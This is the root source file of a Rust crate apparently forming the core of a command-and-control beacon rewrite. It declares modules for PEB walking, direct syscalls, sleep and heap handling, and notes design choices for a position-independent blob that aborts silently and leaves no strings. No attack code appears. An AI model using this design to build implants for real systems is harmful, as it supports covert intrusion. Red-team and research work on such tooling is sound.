//! Specter-rs core — pure logic shared by the beacon.
//!
//! This crate contains everything in the rewrite that manipulates data
//! without touching the Windows API: FNV hashing, wire protocol types,
//! COFF structures, config decoding.
//!
//! Invariants, enforced by CI:
//! - **`no_std`, core items only** — no host API, no allocation, no
//!   formatting: this code is linked into the raw PIC blob where every
//!   byte counts, and any accidental `std` usage breaks the beacon build.
//! - **no panic handler here** — it belongs to the beacon crate alone.
//! - **unit tests live inside the crate** (`#[cfg(test)] extern crate std;`):
//!   the lib-with-tests builds under the std harness on the host, while the
//!   beacon consumes the exact same code as a pure `no_std` dependency.
//!
//! Phase 1 of the roadmap (docs/ETUDE-DE-FAISABILITE.md, section 8).

#![no_std]
// Blob-code discipline: unwrap/expect in the beacon pull panic paths and
// hide logic errors; non-test code uses explicit matches. Tests and the
// build script are out of scope.
#![cfg_attr(not(test), warn(clippy::unwrap_used, clippy::expect_used))]

#[cfg(test)]
extern crate std;

/// Abort silently, the way the C beacon does: no unwinding, no messages, no
/// strings in the binary. Compiled into the PIC blob through the beacon's
/// dependency on this crate; absent under the host test harness (std brings
/// its own), which is why it is `#[cfg(not(test))]`.
///
/// When the nightly toolchain allows `panic_immediate_abort` via build-std
/// (phase 1), this becomes unreachable.
#[cfg(not(test))]
#[panic_handler]
fn spt_panic(_info: &core::panic::PanicInfo) -> ! {
    loop {}
}

pub mod config;
pub mod fnv;
pub mod heap;
pub mod peb;
pub mod rng;
pub mod sleep;
pub mod syscalls;
pub mod time;
